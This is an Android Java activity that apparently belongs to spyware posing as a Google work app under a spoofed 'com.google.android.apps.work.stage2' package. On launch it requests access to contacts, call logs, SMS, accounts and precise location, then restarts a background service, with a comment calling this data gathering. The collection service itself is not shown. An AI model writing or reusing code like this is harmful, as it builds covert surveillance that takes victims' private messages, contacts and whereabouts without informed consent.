package com.google.android.apps.work.stage2;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;

import java.util.ArrayList;
import java.util.List;

public final class MainActivity extends Activity {
    private static final int REQUEST_CODE_PERMISSIONS = 1001;

    @Override
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String[] permissions = {
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.GET_ACCOUNTS,
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION
            };

            List<String> listPermissionsNeeded = new ArrayList<>();
            for (String p : permissions) {
                if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                    listPermissionsNeeded.add(p);
                }
            }

            if (!listPermissionsNeeded.isEmpty()) {
                requestPermissions(listPermissionsNeeded.toArray(new String[0]), REQUEST_CODE_PERMISSIONS);
            } else {
                startMainService();
            }
        } else {
            startMainService();
        }
    }

    private void startMainService() {
        startService(new Intent(this, MainService.class));
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        if (requestCode == REQUEST_CODE_PERMISSIONS) {
            // Re-start service to trigger data gathering with new permissions
            stopService(new Intent(this, MainService.class));
            startMainService();
        }
    }
}
